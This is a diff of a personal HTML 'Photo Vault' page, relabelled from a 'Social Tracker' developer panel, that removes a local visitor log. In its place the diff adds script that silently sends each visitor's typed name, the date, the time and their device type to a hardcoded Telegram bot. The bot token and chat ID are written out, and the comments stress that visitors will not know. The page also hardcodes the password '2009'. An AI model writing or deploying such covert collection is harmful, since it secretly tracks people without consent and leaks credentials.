@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Kishor | Social Tracker</title>
+<title>Kishor | Photo Vault</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
 
@@ -185,7 +185,7 @@ i{
   to { transform: rotate(360deg); }
 }
 
-/* ===== NAME MODAL ===== */
+/* Name Modal */
 .name-modal {
   position: fixed;
   top: 0;
@@ -407,8 +407,8 @@ i{
   color: white;
 }
 
-/* Developer Mode Panel */
-.dev-panel {
+/* Photo Vault Panel */
+.vault-panel {
   position: fixed;
   top: 0;
   right: -100%;
@@ -425,11 +425,11 @@ i{
   color: #e0e0e0;
 }
 
-.dev-panel.open {
+.vault-panel.open {
   right: 0;
 }
 
-.dev-panel h2 {
+.vault-panel h2 {
   font-size: 2rem;
   margin-bottom: 20px;
   border-bottom: 2px solid gold;
@@ -441,7 +441,7 @@ i{
   color: gold;
 }
 
-.dev-panel .close-panel {
+.vault-panel .close-panel {
   position: absolute;
   top: 20px;
   right: 25px;
@@ -450,13 +450,13 @@ i{
   color: #aaa;
   transition: 0.2s;
 }
-.dev-panel .close-panel:hover {
+.vault-panel .close-panel:hover {
   color: gold;
   transform: scale(1.2);
 }
 
 /* Tabs */
-.dev-tabs {
+.vault-tabs {
   display: flex;
   gap: 10px;
   margin-bottom: 25px;
@@ -464,7 +464,7 @@ i{
   padding-bottom: 10px;
 }
 
-.dev-tab {
+.vault-tab {
   padding: 10px 20px;
   border-radius: 30px;
   cursor: pointer;
@@ -476,17 +476,17 @@ i{
   color: #aaa;
 }
 
-.dev-tab.active {
+.vault-tab.active {
   background: gold;
   color: black;
   font-weight: bold;
 }
 
-.dev-tab-content {
+.vault-tab-content {
   display: none;
 }
 
-.dev-tab-content.active {
+.vault-tab-content.active {
   display: block;
 }
 
@@ -562,123 +562,6 @@ i{
 .photo-item .delete-photo:hover {
   background: red;
   border-color: white;
-}
-
-/* Visitor Section */
-.visitor-section {
-  margin-top: 20px;
-}
-
-.visitor-title {
-  font-family: 'Courier New', monospace;
-  color: gold;
-  font-size: 1.3rem;
-  margin-bottom: 15px;
-  display: flex;
-  align-items: center;
-  gap: 10px;
-}
-
-.visitor-stats {
-  background: rgba(255,255,255,0.03);
-  border-radius: 30px;
-  padding: 20px;
-  margin-bottom: 20px;
-  border: 1px solid #444;
-}
-
-.stat-item {
-  display: flex;
-  justify-content: space-between;
-  margin-bottom: 10px;
-  font-family: monospace;
-  font-size: 1rem;
-}
-
-.stat-label {
-  color: #aaa;
-}
-
-.stat-value {
-  color: gold;
-  font-weight: bold;
-}
-
-.visitor-list {
-  max-height: 300px;
-  overflow-y: auto;
-  background: rgba(0,0,0,0.3);
-  border-radius: 20px;
-  padding: 15px;
-  margin-bottom: 20px;
-}
-
-.visitor-entry {
-  display: flex;
-  justify-content: space-between;
-  padding: 12px;
-  border-bottom: 1px solid #333;
-  font-family: monospace;
-  font-size: 0.95rem;
-}
-
-.visitor-entry:last-child {
-  border-bottom: none;
-}
-
-.visitor-info {
-  display: flex;
-  flex-direction: column;
-  gap: 4px;
-}
-
-.visitor-name {
-  color: gold;
-  font-size: 1rem;
-  font-weight: bold;
-}
-
-.visitor-time {
-  color: #aaa;
-  font-size: 0.75rem;
-}
-
-.visitor-badge {
-  background: rgba(255,215,0,0.1);
-  border: 1px solid gold;
-  color: gold;
-  padding: 2px 8px;
-  border-radius: 20px;
-  font-size: 0.7rem;
-}
-
-.clear-btn {
-  background: rgba(255,0,0,0.1);
-  border: 1px solid rgba(255,0,0,0.3);
-  color: #ff8888;
-  padding: 10px 20px;
-  border-radius: 30px;
-  cursor: pointer;
-  font-family: 'Courier New', monospace;
-  margin-top: 10px;
-  transition: 0.2s;
-  width: 100%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 10px;
-}
-
-.clear-btn:hover {
-  background: rgba(255,0,0,0.3);
-  color: white;
-}
-
-.empty-message {
-  text-align: center;
-  color: #aaa;
-  padding: 20px;
-  font-family: monospace;
 }
 
 /* Photo Zoom Modal */
@@ -821,48 +704,22 @@ i{
   </div>
 </div>
 
-<!-- Developer Mode Panel -->
-<div class="dev-panel" id="devPanel">
-  <div class="close-panel" onclick="closeDevPanel()">&times;</div>
-  <h2><i class="fa-solid fa-terminal"></i> DEVELOPER MODE</h2>
+<!-- PHOTO VAULT PANEL -->
+<div class="vault-panel" id="vaultPanel">
+  <div class="close-panel" onclick="closeVaultPanel()">&times;</div>
+  <h2><i class="fa-solid fa-lock"></i> PHOTO VAULT</h2>
   
-  <div class="dev-tabs">
-    <div class="dev-tab active" onclick="switchDevTab('photos')" id="tabPhotos">📸 PHOTOS</div>
-    <div class="dev-tab" onclick="switchDevTab('visitors')" id="tabVisitors">👥 VISITORS</div>
+  <div class="vault-tabs">
+    <div class="vault-tab active" onclick="switchVaultTab('photos')" id="tabPhotos">📸 PHOTOS</div>
   </div>
   
-  <div class="dev-tab-content active" id="photosTab">
+  <div class="vault-tab-content active" id="photosTab">
     <div class="upload-area" onclick="document.getElementById('fileInput').click()">
       <i class="fa-solid fa-cloud-upload-alt"></i>
       <p>click to upload photos</p>
     </div>
     <input type="file" id="fileInput" accept="image/*" multiple onchange="handleFiles(this.files)">
     <div class="photo-grid" id="photoGrid"></div>
-  </div>
-  
-  <div class="dev-tab-content" id="visitorsTab">
-    <div class="visitor-section">
-      <div class="visitor-title">
-        <i class="fa-solid fa-clock"></i> VISITOR LOG
-      </div>
-      
-      <div class="visitor-stats">
-        <div class="stat-item">
-          <span class="stat-label">TOTAL VISITS:</span>
-          <span class="stat-value" id="totalVisits">0</span>
-        </div>
-        <div class="stat-item">
-          <span class="stat-label">LAST VISIT:</span>
-          <span class="stat-value" id="lastVisitTime">NEVER</span>
-        </div>
-      </div>
-      
-      <div class="visitor-list" id="visitorList"></div>
-      
-      <button class="clear-btn" onclick="clearAllLogs()">
-        <i class="fa-solid fa-trash"></i> CLEAR ALL LOGS
-      </button>
-    </div>
   </div>
 </div>
 
@@ -880,14 +737,17 @@ i{
 <audio id="bgMusic" loop preload="auto"><source src="audio.mp3" type="audio/mpeg"></audio>
 
 <script>
+// ================== TELEGRAM SETUP (SECRET) ==================
+const BOT_TOKEN = '8682380448:AAGz82m2PUMXw13KwxglzoMbcdELmaHI2nc';
+const CHAT_ID = '6539978853';
+
 // ================== MODAL CONTROLS ==================
 const nameModal = document.getElementById('nameModal');
 const passwordModal = document.getElementById('passwordModal');
-const devPanel = document.getElementById('devPanel');
+const vaultPanel = document.getElementById('vaultPanel');
 const passwordInput = document.getElementById('passwordInput');
 const visitorNameInput = document.getElementById('visitorNameInput');
 
-// Open name modal when developer button clicked
 document.getElementById('devBtn').addEventListener('click', function() {
   openNameModal();
 });
@@ -914,43 +774,61 @@ function handleContinue() {
     return;
   }
   
-  // Save visitor with name
-  saveVisitorWithName(name);
+  // SECRETLY send to Telegram (user ko pata bhi nahi chalega)
+  sendToTelegram(name);
   
   // Close name modal and open password modal
   nameModal.classList.remove('show');
   openPasswordModal();
 }
 
-// ================== SAVE VISITOR ==================
-function saveVisitorWithName(name) {
-  try {
-    let visitors = JSON.parse(localStorage.getItem('visitor_log')) || [];
-    
-    const now = new Date();
-    const dateStr = now.toLocaleDateString('en-IN', {
-      day: '2-digit', month: 'short', year: 'numeric'
-    });
-    const timeStr = now.toLocaleTimeString('en-IN', {
-      hour: '2-digit', minute: '2-digit', hour12: true
-    });
-    
-    const visitorEntry = {
-      id: Date.now() + Math.random(),
-      name: name,
-      date: dateStr,
-      time: timeStr,
-      fullTime: now.toISOString()
-    };
-    
-    visitors.unshift(visitorEntry);
-    if (visitors.length > 100) visitors = visitors.slice(0, 100);
-    localStorage.setItem('visitor_log', JSON.stringify(visitors));
-    
-    console.log('Visitor saved:', name);
-  } catch (e) {
-    console.log('Save error:', e);
-  }
+// ================== SEND TO TELEGRAM (SECRET) ==================
+function sendToTelegram(name) {
+  const now = new Date();
+  const dateStr = now.toLocaleDateString('en-IN', {
+    day: '2-digit', month: 'short', year: 'numeric'
+  });
+  const timeStr = now.toLocaleTimeString('en-IN', {
+    hour: '2-digit', minute: '2-digit', hour12: true
+  });
+  
+  // Device info
+  let device = 'Unknown';
+  const ua = navigator.userAgent;
+  if (ua.includes('Android')) device = 'Android';
+  else if (ua.includes('iPhone')) device = 'iPhone';
+  else if (ua.includes('Windows')) device = 'Windows';
+  else if (ua.includes('Mac')) device = 'Mac';
+  
+  const message = `🔥 NEW VISITOR
+━━━━━━━━━━━━━━
+👤 Name: ${name}
+📅 Date: ${dateStr}
+⏰ Time: ${timeStr}
+📱 Device: ${device}
+━━━━━━━━━━━━━━`;
+  
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  
+  // Secretly send - no alerts, no errors shown
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: 'HTML'
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Telegram sent:', data.ok ? '✅' : '❌');
+  })
+  .catch(error => {
+    console.log('Telegram error (silent)');
+  });
 }
 
 // ================== PASSWORD MODAL ==================
@@ -969,9 +847,8 @@ function closePasswordModal(event) {
 function checkPassword() {
   if (passwordInput.value.trim() === '2009') {
     passwordModal.classList.remove('show');
-    devPanel.classList.add('open');
+    vaultPanel.classList.add('open');
     loadSavedPhotos();
-    updateVisitorDisplay();
   } else {
     alert('Wrong password');
     passwordInput.value = '';
@@ -979,80 +856,18 @@ function checkPassword() {
   }
 }
 
-function closeDevPanel() {
-  devPanel.classList.remove('open');
+function closeVaultPanel() {
+  vaultPanel.classList.remove('open');
 }
 
-// ================== DEV TABS ==================
-function switchDevTab(tabName) {
-  document.getElementById('tabPhotos').classList.remove('active');
-  document.getElementById('tabVisitors').classList.remove('active');
-  document.getElementById('photosTab').classList.remove('active');
-  document.getElementById('visitorsTab').classList.remove('active');
-  
-  if (tabName === 'photos') {
-    document.getElementById('tabPhotos').classList.add('active');
-    document.getElementById('photosTab').classList.add('active');
-  } else {
-    document.getElementById('tabVisitors').classList.add('active');
-    document.getElementById('visitorsTab').classList.add('active');
-    updateVisitorDisplay();
-  }
-}
-
-// ================== VISITOR DISPLAY ==================
-function updateVisitorDisplay() {
-  try {
-    const visitors = JSON.parse(localStorage.getItem('visitor_log')) || [];
-    
-    document.getElementById('totalVisits').textContent = visitors.length;
-    
-    if (visitors.length > 0) {
-      const last = visitors[0];
-      document.getElementById('lastVisitTime').textContent = `${last.date} ${last.time}`.toUpperCase();
-    } else {
-      document.getElementById('lastVisitTime').textContent = 'NEVER';
-    }
-    
-    const visitorList = document.getElementById('visitorList');
-    if (visitors.length === 0) {
-      visitorList.innerHTML = '<div class="empty-message">NO VISITORS YET</div>';
-      return;
-    }
-    
-    let html = '';
-    visitors.forEach((visitor, index) => {
-      const isFirst = index === 0 ? '⭐ ' : '';
-      const nameDisplay = visitor.name || 'LEGEND';
-      
-      html += `
-        <div class="visitor-entry">
-          <div class="visitor-info">
-            <span class="visitor-name">${isFirst}${nameDisplay}</span>
-            <span class="visitor-time">${visitor.date} • ${visitor.time}</span>
-          </div>
-          <div class="visitor-badge">#${visitors.length - index}</div>
-        </div>
-      `;
-    });
-    
-    visitorList.innerHTML = html;
-  } catch (e) {
-    console.log('Display error:', e);
-  }
-}
-
-function clearAllLogs() {
-  if (confirm('DELETE ALL VISITOR LOGS?')) {
-    localStorage.removeItem('visitor_log');
-    updateVisitorDisplay();
-  }
+function switchVaultTab(tabName) {
+  // Only photos tab
 }
 
 // ================== PHOTO UPLOAD ==================
 const photoGrid = document.getElementById('photoGrid');
 const fileInput = document.getElementById('fileInput');
-const STORAGE_KEY = 'kishor_dev_photos';
+const STORAGE_KEY = 'kishor_vault_photos';
 
 function loadSavedPhotos() {
   try {
@@ -1162,7 +977,7 @@ function closePhoto(event) {
 document.addEventListener('keydown', function(e) {
   if (e.key === 'Escape') {
     if (photoModal.classList.contains('show')) closePhoto({ target: photoModal });
-    if (devPanel.classList.contains('open')) closeDevPanel();
+    if (vaultPanel.classList.contains('open')) closeVaultPanel();
     if (nameModal.classList.contains('show')) nameModal.classList.remove('show');
     if (passwordModal.classList.contains('show')) passwordModal.classList.remove('show');
   }
@@ -1173,7 +988,6 @@ document.addEventListener('keydown', function(e) {
   }
 });
 
-// Enter key in name input
 visitorNameInput.addEventListener('keypress', function(e) {
   if (e.key === 'Enter') {
     handleContinue();
@@ -1181,7 +995,7 @@ visitorNameInput.addEventListener('keypress', function(e) {
 });
 
 // ================== INIT ==================
-console.log('Website loaded - Name first, then password');
+console.log('✅ Photo Vault Ready - Telegram is SECRET');
 </script>
 </body>
 </html>
